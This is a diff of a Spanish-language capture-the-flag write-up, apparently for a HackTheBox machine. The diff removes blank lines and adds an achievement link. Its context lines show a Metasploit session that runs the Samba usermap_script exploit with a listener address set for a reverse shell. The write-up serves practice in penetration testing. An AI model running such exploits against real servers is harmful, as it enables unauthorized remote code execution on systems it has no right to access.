@@ -18,7 +18,6 @@ tags:
   - ssh
   - smb
 ---
-
 ## Information Gathering
 
 ```terminal
@@ -88,7 +87,6 @@ Host script results:
 |_clock-skew: mean: 2h00m26s, deviation: 2h49m45s, median: 23s
 ```
 ---
-
 ## Vulnerability Exploitation
 
 Listo los recursos compartidos disponibles en el servidor SMB. No requiero credenciales.
@@ -183,3 +181,6 @@ msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
 LHOST => 10.10.16.92
 msf6 exploit(multi/samba/usermap_script) > exploit
 ```
+
+> <https://www.hackthebox.com/achievement/machine/1521382/1>
+{: .prompt-tip }
